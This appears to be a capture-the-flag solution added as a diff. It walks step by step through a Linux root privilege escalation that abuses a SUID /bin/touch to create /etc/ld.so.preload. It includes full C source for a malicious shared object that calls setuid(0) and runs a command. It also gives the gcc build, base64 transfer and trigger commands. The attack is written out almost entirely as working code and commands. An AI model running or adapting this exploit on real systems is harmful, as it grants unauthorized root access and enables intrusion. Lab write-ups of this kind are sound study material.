@@ -1,0 +1,31 @@
+1. /bin/touch has SUID set to -rwsr-sr-x. 1 root root 97152 Feb 28 2019 /bin/touch
+2. with umask 000 we create a missing file '/etc/ld.so.preload'
+3. '/etc/ld.so.preload' is processed by the dynamic linker before dynamically linked programs start. after writing the path of an attacker controlled shared object into the file, executing another SUID program causes the loader to load the object with root privileges
+4. Malicious shared object 
+cat payload.c
+#include <stdlib.h>
+#include <unistd.h>
+
+__attribute__((constructor))
+void pwn() {
+    unlink("/etc/ld.so.preload");
+    setuid(0);
+    setgid(0);
+    system("cat /root/flag* /flag* 2>/dev/null > /tmp/flag; chmod 644 /tmp/flag");
+}
+
+5. compile it - 
+gcc -shared -fPIC -nostartfiles -o payload.so payload.c
+
+6. gzip it 'gzip -9 payload.so' and the base64 encode it 'base64 -w 0 payload.so.gz && echo'
+
+7. copy the blob on the machine
+
+base64 -d > /tmp/evil.so.gz << 'ENDBLOB'
+<BASE64_BLOB>
+ENDBLOB
+
+8. Unzip 'gzip -d /tmp/evil.so.gz' and chmod +x /tmp/evil.so and echo '/tmp/evil.so' > /etc/ld.so.preload 
+
+9. Finally we ./touch /tmp/trigger and cat /tmp/flag  we have the flag
+
